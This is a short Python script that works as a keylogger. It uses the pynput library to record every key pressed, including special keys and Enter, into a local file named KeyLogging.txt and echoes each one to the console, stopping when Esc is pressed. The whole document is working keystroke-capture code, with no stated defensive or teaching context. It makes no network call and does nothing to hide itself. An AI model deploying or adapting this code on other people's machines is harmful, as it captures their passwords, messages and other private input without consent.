from pynput.keyboard import Key, Listener

log_file = "KeyLogging.txt"

def log_key(key):
    with open(log_file, "a") as file:
        try:
            key_char = str(key.char)
            file.write(key_char)  
            print(key_char, end='', flush=True)  
        except AttributeError:
            if key == Key.space:
                file.write(' ')
                print(' ', end='', flush=True)
            elif key == Key.enter:
                file.write('[ENTER]\n')
                print('\n[ENTER]')
            else:
                key_name = '[' + str(key) + ']'
                file.write(key_name)
                print(key_name, end='', flush=True)


def stop_keylogger(key):
    if key == Key.esc:
        return False

with Listener(on_press=log_key, on_release=stop_keylogger) as listener:
    listener.join()
